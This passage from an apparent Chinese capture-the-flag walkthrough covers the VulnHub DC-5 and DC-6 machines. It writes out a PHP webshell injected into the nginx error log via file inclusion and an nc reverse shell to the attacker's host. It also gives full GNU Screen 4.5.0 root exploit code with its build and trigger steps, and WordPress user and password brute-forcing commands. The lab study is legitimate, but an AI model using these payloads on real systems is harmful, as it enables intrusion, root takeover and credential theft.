<h3 id="2-利用文件包含拿shell"><a href="#2-利用文件包含拿shell" class="headerlink" title="2.利用文件包含拿shell"></a>2.利用文件包含拿shell</h3><p>既然能够在<code>thank.php</code>里实现文件包含，那我们就试试能不能包含一些敏感文件，来获取更多信息</p>
<h4 id="1）向Nginx错误日志导入一句话🐎"><a href="#1）向Nginx错误日志导入一句话🐎" class="headerlink" title="1）向Nginx错误日志导入一句话🐎"></a>1）向Nginx错误日志导入一句话🐎</h4><p>根据我们之前收集的信息，</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930190721316.png"><img src="/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></a></p>
<p>发现<code>Web server</code>是<code>Nginx</code></p>
<blockquote>
<p>Nginx访问日志：网站访问者有关的活动都记录在访问日志 &#x2F;&#x2F;<code>access_log</code></p>
<p>Nginx错误日志：当访问错误的时候，会把错误参数保存在其中  &#x2F;&#x2F;<code>error_log</code></p>
</blockquote>
<p>所以我们在我们的</p>
<blockquote>
<p><code>url/?file=</code> 的后面加上一句话🐎，<br>然后因为访问错误，错误参数【一句话🐎】就会到<code>nginx的错误日志</code>中，<br>然后利用我们发现的文件包含把错误日记包含在<code>thankyou.php</code>文件中，<br>访问拿到<code>shell</code>，拿到<code>shell</code></p>
</blockquote>
<p><code>nginx</code>配置文件位置：**&#x2F;etc&#x2F;nginx&#x2F;nginx.conf**</p>
<p>我们包含该文件看看<strong>nginx的错误日志文件</strong>位置在哪里</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220930212030059.png"><img src="/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></a></p>
<p>看到文件位置</p>
<blockquote>
<p><code>error_log：/var/log/nginx/error.log</code></p>
</blockquote>
<p>先输入一句话🐎，报错导入<code>nginx</code>错误日志</p>
<hr>
<p><strong>key</strong>：如果直接在网页输入一句话🐎导入错误日志是有问题的</p>
<blockquote>
<p>当我们访问<code>http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
<p>虽然确实把这个信息导入到了 <code>/var/log/nginx/error.log</code> 文件里</p>
<p>但是前端似乎存在过滤，会把&lt;&gt;和’’或””，替换成其他符号，所以当我们想要利用</p>
<p><code>http://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code></p>
<p>这样想利用我们导入的木马拿到shell的时候，实际上我们的木马已经被破坏了，所以根本不能执行我们想要的一系列命令，所以用抓包burp直接发送到服务器，绕过前端过滤先，这样我们的一句话🐎才能发挥它的作用</p>
</blockquote>
<hr>
<p>所以我们执行<strong>抓包操作</strong></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001221200987.png"><img src="/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></a></p>
<p>没有其他回显内容</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001221849004.png"><img src="/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></a></p>
<p>我们在文件包含<code>/var/log/nginx/error.log</code>，并利用<code>cmd</code>参数执行<code>ls</code>试试，看看是否真的把我们的木马包含进去了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001222035413.png"><img src="/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></a></p>
<p>发现确实成功包含进去了，而且还可以执行命令</p>
<p>那我们直接用<code>nc</code>命令反弹<code>shell</code></p>
<h4 id="2）nc命令反弹shell"><a href="#2）nc命令反弹shell" class="headerlink" title="2）nc命令反弹shell"></a>2）nc命令反弹shell</h4><p>先在<code>kali</code>控制台执行<code>nc</code>监听<code>8888</code>端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223417288.png"><img src="/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></a></p>
<p>然后网页浏览</p>
<blockquote>
<p><code>http://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash</code></p>
<p>&#x2F;&#x2F;<code>192.168.133.140</code>是虚拟机ip，不是靶机ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223100801.png"><img src="/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></a></p>
<p>返回控制台查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223320410.png"><img src="/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></a></p>
<p>进入<code>shell</code></p>
<p>然后标准姿势，进入交互式shell</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223408282.png"><img src="/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></a></p>
<h4 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="*获得稳定的shell"></a>*获得稳定的shell</h4><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>
<blockquote>
<p>先在shell，用<code>Ctrl-Z</code>将shell放到后台</p>
<p>再<br><code>stty raw -echo &amp;&amp; fg ; reset</code>  </p>
<p><code>nc -l -vv -p 8888</code>  &#x2F;&#x2F;这个不用输入，是自动执行后台的命令返回到前台</p>
<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>
<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>
<p>&#x2F;&#x2F;fg把shell提到前台来</p>
<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002145951718.png"><img src="/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></a></p>
<p>成功获得全交互式<code>shell</code></p>
<h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><p>拿到shell以后，我们权限明显是不够的，所以我们需要<strong>垂直提权</strong>，拿到最高权限</p>
<p>先看看存不存在<code>suid</code>方式提权</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001223927542.png"><img src="/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></a></p>
<p>似乎没啥可以利用提权的点，但是有个</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224134569.png"><img src="/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>看起来有点陌生，我们<code>百度/google</code>就要利用起来了</p>
<blockquote>
<p><code>GNU Screen</code>是一款由<code>GNU</code>计划开发的用于命令行终端切换的自由软件。</p>
<p>用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。</p>
<p><code>GNU Screen</code>可以看作是窗口管理器的命令行界面版本。</p>
<p>它提供了统一的管理多个会话的界面和相应的功能。</p>
</blockquote>
<p>看来是属于suid当中的漏洞脚本提权，那脚本怎么找呢</p>
<h4 id="1）searchsploit找提权脚本文件"><a href="#1）searchsploit找提权脚本文件" class="headerlink" title="1）searchsploit找提权脚本文件"></a>1）searchsploit找提权脚本文件</h4><p>我们可以使用<code>searchsploit</code>搜索软件相关漏洞有没有可以利用的脚本，而且它的版本号也写出来了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224602898.png"><img src="/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></a></p>
<p>发现有两个文件，一个<code>sh脚本</code>文件，一个<code>txt文本</code>的（POC）</p>
<p>看到有<code>sh脚本</code>文件路径，先查看其内容是什么，看看能不能利用</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224718080.png"><img src="/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></a></p>
<p>发现是个<code>c语言脚本</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001224923228.png"><img src="/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></a></p>
<p>看来我们找的是正确的，我们分析一下该脚本文件，看看怎么利用其来提权</p>
<blockquote>
<p>仔细看其实这里面有两个C语言脚本</p>
<p>【<code>EOF</code>为文结束符号】</p>
<p>而且需要保存到两个c文件中去<br><code>libhax.c</code><br><code>rootshell.c</code></p>
<p>然后用gcc命令<br><code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code><br><code>gcc -o /tmp/rootshell /tmp/rootshell.c</code></p>
<p>对两个c文件进行编译，从而生成<br><code>libhax.so</code><br><code>rootshell</code></p>
<p>然后在把两个c文件和两个编译后生成的文件传入靶机后</p>
<p>在靶机shell挨个执行后面的命令，从而拿到root权限</p>
<p><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</code><br><code>cd /etc</code><br><code>umask 000 # because</code><br><code>screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</code><br><code>echo &quot;[+] Triggering...&quot;</code><br><code>screen -ls # screen itself is setuid, so... /tmp/rootshell</code>                            </p>
</blockquote>
<p>上半部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124640256.png"><img src="/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></a></p>
<p>下半部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124701995.png"><img src="/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></a></p>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<p>我们需要在靶机的&#x2F;tmp目录下，传入</p>
<blockquote>
<p><code>libhax.so</code><br><code>rootshell</code><br><code>flag.sh</code>   &#x2F;&#x2F;内容为后面的命令内容</p>
</blockquote>
<p>这三个文件</p>
<p>我们先在自己的<code>kali</code>机上把这两个文件准备好</p>
<p>我们也可以先到我们<code>kali</code>机的<code>/tmp</code>目录下</p>
<p>先执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124843966.png"><img src="/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></a></p>
<p>再执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002124900295.png"><img src="/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></a></p>
<p>【虽然会报错，但是是正常的，不影响编译后产生的文件的执行】</p>
<p>执行后</p>
<blockquote>
<p><code>libhax.so  rootshell</code><br>这两个文件就生成了</p>
</blockquote>
<p>然后我们的<code>flag.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002134454968.png"><img src="/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></a></p>
<h4 id="2）nc向靶机传入脚本提权文件"><a href="#2）nc向靶机传入脚本提权文件" class="headerlink" title="2）nc向靶机传入脚本提权文件"></a>2）nc向靶机传入脚本提权文件</h4><p><code>当然如果你用蚁剑连接的shell的话，直接把文件拖进去就行，简单一点</code></p>
<p>如果用nc的话当然也不难</p>
<p>先是<code>kali</code>机控制台【目前状态为<code>/tmp</code>下】</p>
<blockquote>
<p><code>nc -lvp 8888 &lt; libhax.so</code>  &#x2F;&#x2F; &lt; 表示传入</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001233201455.png"><img src="/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></a></p>
<p>靶机<code>shell</code>【必须在<code>/tmp</code>目录下才能执行nc】</p>
<blockquote>
<p><code>cd /tmp</code><br><code>nc 192.168.133.140 8888 &gt; libhax.so</code>  &#x2F;&#x2F;&gt;表示传出接收文件,192.168.133.140为kali机ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221001233223666.png"><img src="/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></a></p>
<p>看到传入成功</p>
<p><code>rootshell</code>和<code>flag.sh</code>文件类似，不再展示</p>
<p>最后成功传入</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002132325197.png"><img src="/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></a></p>
<h4 id="3）执行脚本进行提权"><a href="#3）执行脚本进行提权" class="headerlink" title="3）执行脚本进行提权"></a>3）执行脚本进行提权</h4><hr>
<p>传入完成后，给<code>flag.sh</code>加上执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure>

<p>然后执行即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="出现意外"><a href="#出现意外" class="headerlink" title="*出现意外"></a>*<strong>出现意外</strong></h5><p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002173352619.png"><img src="/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></a></p>
<p>不知道有没有朋友也遇到这种报错</p>
<p>最后一步执行<code>rootshell</code>的时候，弹出这个命令，我搜索了一下，猜测是不是c语言脚本写错了，但是仔细检查并没有出错</p>
<p>然后我们看了看我们的<code>kali</code>和<code>靶机</code>的gcc版本</p>
<p>发现</p>
<blockquote>
<p>kali机是：<code>11.3.0-1</code></p>
<p>靶机是：<code>4.9.2</code></p>
</blockquote>
<p>但是编译器不同对结果应该没什么太大影响</p>
<p>但我还是试试能不能在<code>靶机的shell</code>里执行gcc，运行两个c语言脚本文件，得到<code>rootshell</code>和<code>libhax.so</code>文件</p>
<p>但是又出现</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002210307317.png"><img src="/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></a></p>
<p>原来是缺少环境变量，导致无法执行</p>
<h6 id="给cc1配置环境变量"><a href="#给cc1配置环境变量" class="headerlink" title="给cc1配置环境变量"></a>给<code>cc1</code>配置环境变量</h6><p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002205950588.png"><img src="/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></a></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">locate cc1</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure>



<p>然后我们从简，直接在靶机<code>shell</code>执行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>



<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002210611503.png"><img src="/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></a></p>
<h6 id="关键来了【期待】"><a href="#关键来了【期待】" class="headerlink" title="关键来了【期待】"></a>关键来了【期待】</h6><p>我们执行我们的<code>flag.sh</code>脚本【这里是重复的<code>flag.sh</code>，所以名字为<code>flag.sh.1</code>】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002211351948.png"><img src="/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></a></p>
<hr>
<p>终于解决问题后【卡了一天了】</p>
<p>终于成功提权</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002211423172.png"><img src="/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></a></p>
<p>到<code>/root</code>目录下</p>
<p>拿到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002211550887.png"><img src="/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></a></p>
<blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">888b</span>    <span class="number">888</span> d8b                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">8888b</span>   <span class="number">888</span> Y8P                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">88888b</span>  <span class="number">888</span>                                                          <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888Y88b</span> <span class="number">888</span> <span class="number">888</span>  .d8888b .d88b.       <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span>  .d88b.  <span class="number">888</span>d888 <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span> Y88b888 <span class="number">888</span> d88P<span class="string">&quot;   d8P  Y8b      888  888  888 d88&quot;</span><span class="string">&quot;88b 888P&quot;</span>   <span class="number">888</span> .<span class="number">88</span>P <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span>  Y88888 <span class="number">888</span> <span class="number">888</span>     <span class="number">88888888</span>      <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>     <span class="number">888888</span>K  Y8P Y8P Y8P </span><br><span class="line"><span class="attribute">888</span>   Y8888 <span class="number">888</span> Y88b.   Y8b.          Y88b <span class="number">888</span> d88P Y88..<span class="number">88</span>P <span class="number">888</span>     <span class="number">888</span> <span class="string">&quot;88b  &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line"><span class="attribute">888</span>    Y888 <span class="number">888</span>  <span class="string">&quot;Y8888P &quot;</span>Y8888        <span class="string">&quot;Y8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  <span class="number">888</span>     <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span>                                                                                                                 </span><br></pre></td></tr></table></figure>


<p><code>Once again, a big thanks to all those who do these little challenges,</code><br><code>and especially all those who give me feedback - again, it&#39;s all greatly</code><br><code>appreciated.  :-)</code></p>
<p><code>I also want to send a big thanks to all those who find the vulnerabilities</code><br><code>and create the exploits that make these challenges possible.</code></p>
<p>翻译：                                                                                      </p>
<p>再次非常感谢所有完成这些小挑战的人，<br>尤其是所有给我反馈的人——再一次，这一切都很棒<br>赞赏。 :-)</p>
<p>我还要非常感谢所有发现漏洞的人<br>并创造使这些挑战成为可能的漏洞。</p>
</blockquote>
<p><code>吐血了，果然是中级，顺便提醒一下大家，非必要不要更新</code></p>
<p><strong>一个旗子找完，游戏结束【吐血了】</strong></p>
<hr>
<h1 id="六、DC-6-中级"><a href="#六、DC-6-中级" class="headerlink" title="六、DC-6[中级]"></a>六、DC-6[中级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h2><p>先抬手<code>nmap</code>扫描一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006214334035.png"><img src="/vulnhub/image-20221006214334035.png" alt="image-20221006214334035"></a></p>
<blockquote>
<p>发现<br><code>22</code>端口：运行着<code>ssh</code>【默认端口】<br><code>80</code>端口：运行着<code>http</code>【默认端口】</p>
</blockquote>
<p>看来可能是需要<code>ssh</code>连接拿<code>shell</code></p>
<hr>
<p>这个靶机好像需要配置<code>hosts</code>文件，不然通过<code>ip</code>是访问不了网站的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006215651658.png"><img src="/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></a></p>
<p>然后访问试试</p>
<p>好了【但是好像有点卡】</p>
<p>界面和<code>DC2</code>一样【梦回<code>DC2</code>，操作应该差不多】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006220758221.png"><img src="/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></a></p>
<hr>
<p>习惯看看<code>wappalyzer</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006221445685.png"><img src="/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></a></p>
<p>看到<code>CMS</code>是<code>WordPress 5.1.1</code></p>
<p>想到可以利用一下这个版本的漏洞，拿到一些敏感信息</p>
<hr>
<p>我们再看看网站上有没有可以利用的信息</p>
<p><code>about us</code>里似乎全是文本内容没啥提示</p>
<p>看到有个<code>concact us</code>，可能有交互利用的地方</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006222942930.png"><img src="/vulnhub/image-20221006222942930.png" alt="image-20221006222942930"></a></p>
<p>虽然看起来没有但是其实是有的</p>
<p>通过<code>concact us</code>页面的url，在后面加上用户的名字就可以</p>
<blockquote>
<p><code>http://xxx/admin</code>  </p>
<p>&#x2F;&#x2F;当然其实并不太重要，不过可以试试看，能不能留言xss然后挟持管理员账户，不过这并不是实际情况，所以可以自己留言，然后登录看看</p>
</blockquote>
<hr>
<h2 id="1-wpscan爆破出用户名【dc2里搞过】"><a href="#1-wpscan爆破出用户名【dc2里搞过】" class="headerlink" title="1.wpscan爆破出用户名【dc2里搞过】"></a>1.wpscan爆破出用户名【dc2里搞过】</h2><p>看到<code>wordpress</code>先用<code>wpscan</code>搞一下</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -e u</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006235057457.png"><img src="/vulnhub/image-20221006235057457.png" alt="image-20221006235057457"></a></p>
<p>得到用户名</p>
<blockquote>
<p><code>admin</code><br><code>mark</code><br><code>graham</code><br><code>sarah</code><br><code>jens</code></p>
</blockquote>
<p>我们创建一个<code>user.txt</code></p>
<p>哪在哪里登录呢？我们在开始页面并没有看到登录窗口</p>
<p>我们用<code>dirb</code>扫一下</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="comment">//wordy</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221009231112282.png"><img src="/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221009231340911.png"><img src="/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></a></p>
<hr>
<h2 id="2-wpscan爆破密码"><a href="#2-wpscan爆破密码" class="headerlink" title="2.wpscan爆破密码"></a>2.wpscan爆破密码</h2><p>我们再找一个密码表，这里用和<code>DC2</code> <code>cewl</code>命令爬一下网站，看看能不能利用其中有没有密码</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure>

